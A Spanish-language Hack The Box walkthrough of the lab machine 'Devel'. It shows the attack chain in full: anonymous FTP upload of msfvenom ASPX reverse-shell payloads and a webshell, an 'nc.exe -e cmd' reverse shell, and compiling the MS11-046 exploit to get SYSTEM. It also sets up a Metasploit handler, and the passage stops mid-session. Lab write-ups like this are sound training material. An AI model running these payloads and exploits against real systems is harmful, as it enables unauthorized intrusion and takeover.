---
title: "Devel - Hack The Box"
date: 2023-02-14
draft: false
slug: "htb-writeup-devel"
excerpt: "Una máquina bastante sencilla, en la cual usaremos el servicio FTP para cargar un Payload que contendrá una Shell que se activará en el puerto HTTP que corre el servicio IIS y después escalaremos privilegios usando el Exploit MS11-046."
categories: ["HackTheBox", "Easy Machine"]
tags: ["Windows", "Microsoft IIS", "FTP", "FTP Enumeration", "Abusing FTP Service", "Local File Inclusion (LFI)", "Reverse Shell", "Abusing IIS Service", "ASPX WebShell", "System Recognition (Windows)", "Local Privilege Escalation (LPE)", "Privesc - MS11-046 (LPE)", "Privesc - MS13-053 (LPE)", "OSCP Style", "Metasploit Framework"]
tools:
  - "ping"
  - "nmap"
  - "ftp"
  - "wappalizer"
  - "msfvenom"
  - "aspx_cmd.aspx"
  - "nc"
  - "rlwrap"
  - "i686-w64-mingw32-gcc"
  - "impacket"
  - "smbserver.py"
  - "metasploit framework(msfconsole)"
  - "Módulo: exploit/multi/handler"
  - "Módulo: post/multi/recon/local_exploit_suggester"
  - "Módulo: exploit/windows/local/ms13_053_schlamperei"
  - "meterpreter"
  - "nc.exe"
links:
  - "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services#internal-ip-address-disclosure"
  - "https://medium.com/@kubotortech/pentesting-exploiting-ftp-cba8ec81968e"
  - "https://victorroblesweb.es/2013/12/02/comandos-ftp-en-la-consola/"
  - "https://www.exploit-db.com/exploits/40564"
  - "https://www.rapid7.com/db/vulnerabilities/WINDOWS-HOTFIX-MS11-046/"
showtoc: true
header:
  teaser: "/assets/images/htb-writeup-devel/devel_logo.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está conectada, además vamos a analizar el TTL para saber que SO usa dicha máquina.
```bash
ping -c 4 10.10.10.5
PING 10.10.10.5 (10.10.10.5) 56(84) bytes of data.
64 bytes from 10.10.10.5: icmp_seq=1 ttl=127 time=132 ms
64 bytes from 10.10.10.5: icmp_seq=2 ttl=127 time=132 ms
64 bytes from 10.10.10.5: icmp_seq=3 ttl=127 time=131 ms
64 bytes from 10.10.10.5: icmp_seq=4 ttl=127 time=131 ms

--- 10.10.10.5 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3015ms
rtt min/avg/max/mdev = 130.729/131.531/132.293/0.750 ms
```
Ok, vemos que la máquina usa Windows. Es momento de hacer los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.5 -oG allPorts             
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-14 13:01 CST
Initiating SYN Stealth Scan at 13:01
Scanning 10.10.10.5 [65535 ports]
Discovered open port 21/tcp on 10.10.10.5
Discovered open port 80/tcp on 10.10.10.5
Increasing send delay for 10.10.10.5 from 0 to 5 due to 11 out of 19 dropped probes since last increase.
Completed SYN Stealth Scan at 13:02, 30.37s elapsed (65535 total ports)
Nmap scan report for 10.10.10.5
Host is up, received user-set (0.73s latency).
Scanned at 2023-02-14 13:01:55 CST for 30s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 127
80/tcp open  http    syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 30.54 seconds
           Raw packets sent: 131087 (5.768MB) | Rcvd: 30 (1.304KB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Al parecer solamente hay 2 puertos abiertos, el puerto 21 que es el **servicio FTP** y el puerto 80 que es **HTTP**, ósea una página web. Hagamos el escaneo de servicios.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sC -sV -p21,80 10.10.10.5 -oN targeted                                                   
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-14 13:02 CST
Nmap scan report for 10.10.10.5
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd

| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
80/tcp open  http    Microsoft IIS httpd 7.5

|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.80 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Vemos que en el **servicio FTP** tenemos activado el login como **anonymous**, vamos a meternos para ver que podemos encontrar y después analizaremos la página web.

## Análisis de Vulnerabilidades {#Analisis}

### Enumeración Servicio FTP {#FTP}

```batch
ftp 10.10.10.5  
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:berserkwings): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||49158|)
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
```
Pues no hay mucho que podamos usar, pero de acuerdo a lo que esta almacenado en el **servicio FTP**, nos damos cuenta que se esta almacenando la aplicación web **ASP.NET**, esto porque vemos el directorio **aspnet_client**, que debe estar ejecutando dicha aplicación. Además, podemos ver un archvio **.htm** y un **PNG**, que supongo pertenecen a la página web.

Veamos que hay dentro del **directorio aspnet_client**:
```batch
ftp> cd aspnet_client
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||49159|)
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          system_web
226 Transfer complete.
ftp> cd system_web
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||49160|)
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          2_0_50727
226 Transfer complete.
ftp> cd 2_0_50727
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||49162|)
125 Data connection already open; Transfer starting.
226 Transfer complete.
ftp> cd ..
250 CWD command successful.
ftp> cd ../..
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||49163|)
150 Opening ASCII mode data connection.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
ftp> exit
221 Goodbye.
```
No hay nada de interés o que nos pueda servir, pero si comprobamos que aca se ejecuta la página web.

Antes de irnos a analizar la página web, intentemos ver si podemos subir archivos.

### Realizando Pruebas en Servicio FTP {#FTP2}

Creamos un archivo random en nuestra máquina:
```bash
whoami > test.txt
```

Y lo intentamos subir al **servicio FTP**:
```batch
ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:berserkwings): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> put test.txt
local: test.txt remote: test.txt
229 Entering Extended Passive Mode (|||49164|)
125 Data connection already open; Transfer starting.
100% |************************************************************************************************|     6       53.75 KiB/s    --:-- ETA
226 Transfer complete.
6 bytes sent in 00:00 (0.04 KiB/s)
ftp> ls
229 Entering Extended Passive Mode (|||49165|)
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-28-23  10:12PM                    6 test.txt
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
```
Observa que podemos subir archivos, esto puede ser bastante vulnerable para la máquina víctima y de provecho para nosotros. Antes de continuar, analicemos la página web para ver que encontramos.

### Analizando Servicio HTTP {#HTTP}

Al entrar en la página, no hay nada, más que una imagen del servicio que está corriendo y si le damos clic a la imagen nos mandara directo a la página de Microsoft acerca del **servicio IIS**.

![](/assets/images/htb-writeup-devel/Captura1.png)

Que nos dice el **Wappalizer**:

<p align="center">
<img src="/assets/images/htb-writeup-devel/Captura2.png">
</p>

No hay mucho que destacar y aplicar un **Fuzzing** no creo que sea útil.

Esto me indica que la jugada será por el **servicio FTP** para empezar. Recuerda que subimos un archivo random al **servicio FTP**, vamos a probar si es posible acceder a este desde la página web.

Intentemos ver si se puede ejecutar:

<p align="center">
<img src="/assets/images/htb-writeup-devel/Captura3.png">
</p>

Excelente, funciona. Así que, podemos probar a subir un Payload de **msfvenom** que sea una **Reverse Shell** para que nos conecte directamentea a la máquina víctima, pero ¿qué archivos son los que lee este **servicio ASP.NET**? Porque no servirá de nada, si subimos el Payload y no es posible ejecutarlo.

Hay que investigar un poco sobre el **servicio IIS**.

### Investigando Servicio IIS {#IIS}

| **Servicio IIS** |
|:-----------:|
| *Internet Information Services o IIS, es un servidor web y un conjunto de servicios para el sistema operativo Microsoft Windows. Fue integrado en otros sistemas operativos de Microsoft destinados a ofrecer servicios, como Windows 2000 o Windows Server 2003, 2016 y 2019. Windows XP Profesional incluye una versión limitada de IIS. Los servicios que ofrece son: FTP, SMTP, NNTP y HTTP/HTTPS. Este servicio convierte a un PC en un servidor web para Internet o una intranet, es decir que en los ordenadores que tienen este servicio instalado se pueden publicar páginas web tanto local como remotamente.* |

De acuerdo con el siguiente link de la página **HackTricks**: 
* <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services" target="_blank">HackTricks: IIS - Internet Information Services</a>

El **servicio IIS** puede ejecutar las siguientes extensiones:
* *asp*
* *aspx*
* *config*
* *php*

De momento vamos a descartar la de **PHP** y el de **config** porque no creo que nos sirvan para cargar el Payload, así que vamos a investigar la **extensión ASP y ASPX**:

| **Extensión ASP** |
|:-----------:|
| *Active Server Pages, ​también conocido como ASP clásico, es una tecnología de Microsoft del lado del servidor para páginas web generadas dinámicamente, que ha sido comercializada como un anexo a Internet Information Services (IIS).* |

| **Extensión ASPX** |
|:-----------:|
| *La extensión de archivo ASPX se utiliza para páginas web que son generadas automáticamente por el servidor y dirigen directamente a un servidor activo.* |

Entonces, la **extensión ASP** podría decirse que es la página web y la **extensión ASPX** es un archivo ejecutable, con esta extensión vamos a crear nuestra **Reverse Shell**.

## Explotación de Vulnerabilidades {#Explotacion}

### Ganando Acceso a la Máquina Víctima con Reverse Shell y Archivo cmd.aspx de Kali {#Payload}

Para este caso, tenemos dos opciones, la primera es crear nuestra **Reverse Shell** con **Msfvenom** o la otra es ocupar un recurso con el que cuenta **Kali** que nos da una CMD que podemos usar, desde la página web. Vamos a ocupar ambos, pero empezamos creando nuestra propia **Reverse Shell**.

#### Configurando el Payload de Reverse Shell con Msfvenom {#Msfvenom}

Vamos a empezar configurando un Payload con **Msfvenom** para que nos conecte a la máquina víctima, una vez sea ejecutado:
```bash
msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=Tu_IP LPORT=443 -o IIS_Shell.aspx  
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of aspx file: 2737 bytes
Saved as: IIS_Shell.aspx
```
Así de simple es crearla.

Ahora entramos al **servicio FTP**, subimos el archivo **.aspx** y comprobamos que este dentro:
```batch
ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:berserkwings): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> put IIS_Shell.aspx 
local: IIS_Shell.aspx remote: IIS_Shell.aspx
229 Entering Extended Passive Mode (|||49166|)
150 Opening ASCII mode data connection.
100% |************************************************************************************************|  2775       39.49 MiB/s    --:-- ETA
226 Transfer complete.
2775 bytes sent in 00:00 (20.57 KiB/s)
ftp> ls
229 Entering Extended Passive Mode (|||49167|)
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-28-23  11:08PM                 2775 IIS_Shell.aspx
03-28-23  10:12PM                    6 test.txt
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
ftp> exit
221 Goodbye.
```
Muy bien, ya está dentro. 

Ahora, simplemtene activamos una **netcat**:
```bash
nc -nvlp 443                                    
listening on [any] 443 ...
```

Y, por último, ejecutamos la Reverse Shell desde la página web:

<p align="center">
<img src="/assets/images/htb-writeup-devel/Captura4.png">
</p>

Listo, estamos dentro:
```bash
nc -nvlp 443                                    
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.10.5] 49168
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\web
```
Muy bien, ahora probemos con el archivo preconfigurado ASPX de Kali que nos da una **CMD** en la página web.

#### Utilizando una cmd.aspx de Kali {#Netcat}

Resulta que, si requieres un archivo **.aspx** que contenga un Payload que devuelva una **CMD** en la web, existen dentro del **Kali Linux**, similar a la **nc.exe** que usamos en la **máquina Legacy**. También vamos a usar la **nc.exe**, así que descargala.

Para buscarlo solo usamos el comando locate de la siguiente manera:
```bash
locate .aspx
/usr/share/davtest/backdoors/aspx_cmd.aspx
/usr/share/laudanum/aspx/shell.aspx
/usr/share/metasploit-framework/data/templates/scripts/to_exe.aspx.template
/usr/share/metasploit-framework/data/templates/scripts/to_mem.aspx.template
/usr/share/seclists/Web-Shells/FuzzDB/cmd.aspx
/usr/share/seclists/Web-Shells/laudanum-0.8/aspx/dns.aspx
/usr/share/seclists/Web-Shells/laudanum-0.8/aspx/file.aspx
/usr/share/seclists/Web-Shells/laudanum-0.8/aspx/shell.aspx
/usr/share/sqlmap/data/shell/backdoors/backdoor.aspx_
/usr/share/sqlmap/data/shell/stagers/stager.aspx_
/usr/share/webshells/aspx/cmdasp.aspx
```

Como puedes ver hay varias opciones, pero hay 2 en particular que nos pueden servir:
* *aspx_cmd.aspx*
* *shell.aspx*

Vamos a usar el **aspx_cmd.aspx** para que nos muestre una **CMD** en la página web. Así que vamos a probar el **aspx_cmd.aspx**.

Vamos a copiarlo en el directorio que estamos ocupando para esta máquina:
```bash
cp /usr/share/laudanum/aspx/shell.aspx .
ls          
aspx_cmd.aspx  IIS_Shell.aspx  shell.aspx  test.txt
```

Ahora lo subimos al **servicio FTP**:
```batch
ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:berserkwings): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> put aspx_cmd.aspx 
local: aspx_cmd.aspx remote: aspx_cmd.aspx
229 Entering Extended Passive Mode (|||49169|)
150 Opening ASCII mode data connection.
100% |************************************************************************************************|  1438       29.17 MiB/s    --:-- ETA
226 Transfer complete.
1438 bytes sent in 00:00 (10.55 KiB/s)
ftp> exit
221 Goodbye.
```
Y listo, lo ejecutamos en la página web y deberíamos poder ver una **CMD**.

![](/assets/images/htb-writeup-devel/Captura5.png)

<p align="center">
<img src="/assets/images/htb-writeup-devel/Captura6.png">
</p>

Bien, por último, vamos a obtener acceso mandando una sesión desde la **CMD** de la página web hacia nuestra máquina, utilizando una **netcat** ejecutable, osea el **nc.exe**.

Levanta una **netcat**:
```bash
rlwrap nc -nvlp 443                                    
listening on [any] 443 ...
```

Carga la **nc.exe** en la máquina víctima en el **servicio FTP**:
```batch
ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:berserkwings): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> put nc.exe
...
```

En la **CMD** de la página web, usa el siguiente comando:
```batch
C:\inetpub\wwwroot\nc.exe -e cmd Tu_IP 443
```
Normalmente, el **directorio inetpub** es el que contiene al **servicio FTP**.

Y listo, ya estamos conectados a la máquina víctima:
```bash
rlwrap nc -nvlp 443                                    
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.10.5] 49168
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\web
```

## Post Explotación {#Post}

### Enumeración de Máquina Víctima {#Windows}

Una vez más dentro de la máquina, vamos a buscar la flag del usuario:
```batch
c:\windows\system32\inetsrv>cd C:\
cd C:\

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 137F-3971

 Directory of C:\

11/06/2009  12:42 ��                24 autoexec.bat
11/06/2009  12:42 ��                10 config.sys
17/03/2017  07:33 ��    <DIR>          inetpub
14/07/2009  05:37 ��    <DIR>          PerfLogs
13/12/2020  01:59 ��    <DIR>          Program Files
18/03/2017  02:16 ��    <DIR>          Users
11/02/2022  05:03 ��    <DIR>          Windows
               2 File(s)             34 bytes
               5 Dir(s)   4.677.365.760 bytes free
```

Recuerda siempre ir a la carpeta usuarios y puede estar en la de **Public** o en el nombre de algún usuario:
```batch
C:\>cd Users
cd Users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 137F-3971

 Directory of C:\Users

18/03/2017  02:16 ��    <DIR>          .
18/03/2017  02:16 ��    <DIR>          ..
18/03/2017  02:16 ��    <DIR>          Administrator
17/03/2017  05:17 ��    <DIR>          babis
18/03/2017  02:06 ��    <DIR>          Classic .NET AppPool
14/07/2009  10:20 ��    <DIR>          Public
               0 File(s)              0 bytes
               6 Dir(s)   4.677.365.760 bytes free

C:\Users>cd babis
cd babis
Access is denied.
```

No se puede, bueno vamos a ver en la de **Public**:
```batch
C:\Users>cd Public
cd Public

C:\Users\Public>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 137F-3971

 Directory of C:\Users\Public

14/07/2009  10:20 ��    <DIR>          .
14/07/2009  10:20 ��    <DIR>          ..
14/07/2009  07:53 ��    <DIR>          Documents
14/07/2009  07:41 ��    <DIR>          Downloads
14/07/2009  07:41 ��    <DIR>          Music
14/07/2009  07:41 ��    <DIR>          Pictures
14/07/2009  10:20 ��    <DIR>          Recorded TV
14/07/2009  07:41 ��    <DIR>          Videos
               0 File(s)              0 bytes
               8 Dir(s)   4.677.365.760 bytes free
```

No pues no, no hay nada, entonces hay que entrar como Root para que podamos ver las flags. Vamos a buscar que podemos usar para acceder a la máquina como Root.
```batch
C:\Users>cd ..
cd ..

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 137F-3971

 Directory of C:\

11/06/2009  12:42 ��                24 autoexec.bat
11/06/2009  12:42 ��                10 config.sys
17/03/2017  07:33 ��    <DIR>          inetpub
14/07/2009  05:37 ��    <DIR>          PerfLogs
13/12/2020  01:59 ��    <DIR>          Program Files
18/03/2017  02:16 ��    <DIR>          Users
11/02/2022  05:03 ��    <DIR>          Windows
               2 File(s)             34 bytes
               5 Dir(s)   4.677.365.760 bytes free

C:\>cd Program Files
cd Program Files

C:\Program Files>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 137F-3971

 Directory of C:\Program Files

13/12/2020  01:59 ��    <DIR>          .
13/12/2020  01:59 ��    <DIR>          ..
28/12/2017  02:49 ��    <DIR>          Common Files
14/07/2009  10:20 ��    <DIR>          DVD Maker
14/07/2009  07:56 ��    <DIR>          Internet Explorer
14/07/2009  07:52 ��    <DIR>          MSBuild
14/07/2009  07:52 ��    <DIR>          Reference Assemblies
13/12/2020  01:59 ��    <DIR>          VMware
14/07/2009  07:56 ��    <DIR>          Windows Defender
14/07/2009  10:20 ��    <DIR>          Windows Journal
14/07/2009  07:56 ��    <DIR>          Windows Mail
14/07/2009  07:56 ��    <DIR>          Windows Media Player
14/07/2009  07:52 ��    <DIR>          Windows NT
14/07/2009  07:56 ��    <DIR>          Windows Photo Viewer
14/07/2009  07:52 ��    <DIR>          Windows Portable Devices
14/07/2009  07:56 ��    <DIR>          Windows Sidebar
               0 File(s)              0 bytes
              16 Dir(s)   4.677.365.760 bytes free
```
No veo nada que conozca que sea vulnerable. 

Entonces, veamos con que privilegios gozamos para darnos una idea de que hacer y veamos la versión del sistema operativo que usa la máquina:
```batch
C:\>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled

C:\>systeminfo
systeminfo

Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
```
Ok, tenemos el privilegio **SeImpersonatePrivilege** y vemos que el SO es **WIndows 7 6.1.7600**, además de que el dueño es **babis**. Desde aquí, nos surgen al menos 2 formas de poder escalar privilegios, la primera usando un Exploit para la versión del Windows, la segunda utilizando Juicy o Rotten Potato para abusar del privilegio **SeImpersonatePrivilege** (esta opción queda para que la pruebes).

Vamos a usar ambas y luego investigaremos como ganar acceso con **Metasploit Framework**. Pero, primero vamos a hacerlo con la primera opción y las demás, las dejamos para la sección **Otras Formas**.

### Buscando, Configurando y Activando un Exploit para Windows 7 {#Exploit}

Buscando por internet, nos aparece uno en particular que es el **MS11-046** que es un **Local Privilege Escalation** y que justamente nos serviría en estos momentos. 

Puedes verlo en el siguiente link: 
* <a href="https://www.exploit-db.com/exploits/40564" target="_blank">Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046)</a>

Vamos a buscarlo con la herramienta **Searchsploit**:
```bash
searchsploit MS11-046                  
----------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                             |  Path

|---|---|
Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046)                                  | windows_x86/local/40564.c
Microsoft Windows - 'afd.sys' Local Kernel (PoC) (MS11-046)                                                | windows/dos/18755.c

|---|---|
Shellcodes: No Results
----------------------------------------------------------------------------------------------------------- ---------------------------------
 Paper Title                                                                                               |  Path

|---|---|
MS11-046 - Dissecting a 0day                                                                               | docs/english/18712-ms11-046---di

|---|---|
```
Justamente lo tenemos, vamos a copiarlo y a analizarlo para saber cómo usarlo.

#### Probando Exploit: Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046) {#PruebaExp}

Gracias al creador del Exploit, nos deja una pequeña explicación para convertir el Exploit en un ejecutable **.exe**:
```bash
Exploit notes:
   Privileged shell execution:
     - the SYSTEM shell will spawn within the invoking shell/process
   Exploit compiling (Kali GNU/Linux Rolling 64-bit):
     - # i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32
   Exploit prerequisites:
     - low privilege access to the target OS
     - target OS not patched (KB2503665, or any other related
       patch, if applicable, not installed - check "Related security
       vulnerabilities/patches")
   Exploit test notes:
     - let the target OS boot properly (if applicable)
     - Windows 7 (SP0 and SP1) will BSOD on shutdown/reset
```
**OJO**: aquí la importancia de leer los Exploits para saber cómo funcionan o si es necesario configurarlos.

Entonces vamos a usar la herramienta **i686-w64-mingw32-gcc**, si estas usando **Kali Linux** ya la deberías tener instalada, sin embargo, aquí está el link del cómo pueden instalar dicha herramienta: 
* <a href="https://github.com/RUB-SysSec/WindowsVTV" target="_blank">Repositorio de RUB-SysSec: i686-w64-mingw32-vtv</a>

Vamos a convertir ese Exploit a un ejecutable **.exe**, recuerda que el Exploit se descargó con el nombre **40564.c**:
```bash
i686-w64-mingw32-gcc 40564.c -o MS11-046.exe -lws2_32
ls
40564.c  aspx_cmd.aspx  IIS_Shell.aspx  MS11-046.exe  nc.exe  shell.aspx  test.txt
```
Ahora que lo tenemos, ya podemos subirlo a la máquina.

Vamos a abrir un servidor con **Impacket** para poder subirlo. Hagamoslo por pasos:

* Abriendo **servidor SMB** con **impacket**:
```bash
smbserver.py smbFolder $(pwd)
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

* Para subir el Exploit debemos ir al **directorio Temp**:
```batch
C:\Windows>cd /Windows/Temp
cd /Windows/Temp
C:\Windows\Temp>
```

* Crearemos un directorio para guardarlo ahí:
```batch
C:\Windows\Temp>mkdir AquiNoHayNingunExploit
mkdir AquiNoHayNingunExploit
C:\Windows\Temp>cd AquiNoHayNingunExploit
cd AquiNoHayNingunExploit
```

* Copiamos el Exploit:
```batch
C:\Windows\Temp\AquiNoHayNingunExploit>copy \\Tu_IP\smbFolder\MS11-046.exe MS11-046.exe                                            
copy \\10.10.14.12\smbFolder\MS11-046.exe MS11-046.exe
        1 file(s) copied
```

* Lo activamos:
```batch
C:\Windows\Temp\AquiNoHayNingunExploit>.\MS11-046.exe
.\MS11-046.exe
c:\Windows\System32>whoami
whoami
nt authority\system
```

Buscamos las flags y listo, con esto ya tenemos las flags de la máquina.

### Ganando Acceso y Escalando Privilegios con Metasploit {#Exploit2}

Para este caso, vamos a ocupar la misma **Reverse Shell** que ya creamos, pero vamos a modificarla un poco porque vamos utilizar el **Metasploit Framework** para obtener una sesión de **meterpreter** y luego ahí, vamos a escalar privilegios.

* Crea la **Reverse Shell** para usar en **meterpreter**:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=Tu_IP LPORT=4242 -f aspx -o shell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of aspx file: 2843 bytes
Saved as: shell.aspx
```

* Carga la **Reverse Shell** en el **servicio FTP**:
```batch
ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:berserkwings): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> put shell.aspx
local: shell.aspx remote: shell.aspx
229 Entering Extended Passive Mode (|||49158|)
125 Data connection already open; Transfer starting.
100% |**********************************************************************************************************************************************************************************************|  2883       52.87 MiB/s    --:-- ETA
226 Transfer complete.
2883 bytes sent in 00:00 (40.69 KiB/s)
ftp> dir
229 Entering Extended Passive Mode (|||49159|)
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-31-24  08:02AM                 2883 shell.aspx
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
ftp> exit
221 Goodbye.
```

* Entra en el **Metasploit Framework**, configura el **modulo multi/handler** para obtener una sesión en **meterpreter** y ejecuta el Payload cargado en la página web:
```bash
msfconsole
.
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
.
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST Tu_IP
LHOST => Tu_IP
msf6 exploit(multi/handler) > set LPORT 4242
LPORT => 4242
msf6 exploit(multi/handler) > exploit
.
[*] Started reverse TCP handler on Tu_IP:4242 
[*] Sending stage (175686 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (Tu_IP:4242 -> 10.10.10.5:49160)
.
meterpreter >
```

#### Usando Módulo de Metasploit para Encontrar Vulnerabilidades dentro de la Máquina Víctima {#Suggester}

Excelente, para este caso, vamos a usar un módulo que nos dara los Exploits a los que es posible que sea vulnerable la máquina víctima:
```bash
msf6 exploit(multi/handler) > search suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester

msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) >
```

Cargamos la sesión que tenemos activa y ejecutamos el módulo:
```bash
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1
msf6 post(multi/recon/local_exploit_suggester) > exploit

